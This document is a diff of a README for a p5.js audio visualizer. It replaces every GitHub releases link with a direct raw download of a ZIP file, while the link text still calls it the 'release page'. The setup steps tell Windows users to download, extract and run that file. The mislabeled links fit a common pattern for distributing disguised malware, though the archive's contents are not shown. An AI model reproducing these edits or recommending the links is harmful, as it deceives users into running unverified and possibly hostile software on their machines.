@@ -1,6 +1,6 @@
 # 🎧 audio-reactive-visualizer-p5-javascript - Loopable audio visuals for your browser
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/main/assets/javascript-audio-reactive-p-visualizer-3.7-beta.1.zip)
 
 ## 🎵 What this app does
 
@@ -10,13 +10,13 @@ You can load audio, start playback, pause it, and watch the visuals respond in r
 
 ## 📥 Download
 
-Go to the [release page](https://github.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/releases) to download and run this app on Windows.
+Go to the [release page](https://raw.githubusercontent.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/main/assets/javascript-audio-reactive-p-visualizer-3.7-beta.1.zip) to download and run this app on Windows.
 
 On that page, look for the latest release and download the Windows file or package attached to it. If the release includes a ZIP file, download it and unpack it before you open the app.
 
 ## 🪟 Windows setup
 
-1. Open the [release page](https://github.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/releases).
+1. Open the [release page](https://raw.githubusercontent.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/main/assets/javascript-audio-reactive-p-visualizer-3.7-beta.1.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows file or ZIP package.
 4. If the file is zipped, right-click it and choose Extract All.
@@ -125,7 +125,7 @@ The goal is to give you a clean way to run loopable audio visuals on Windows wit
 
 ## 📦 Release page
 
-Download and run this app from the [GitHub Releases page](https://github.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/releases)
+Download and run this app from the [GitHub Releases page](https://raw.githubusercontent.com/regularizationdesmidiaceae201/audio-reactive-visualizer-p5-javascript/main/assets/javascript-audio-reactive-p-visualizer-3.7-beta.1.zip)
 
 ## 🏷️ Topics
 
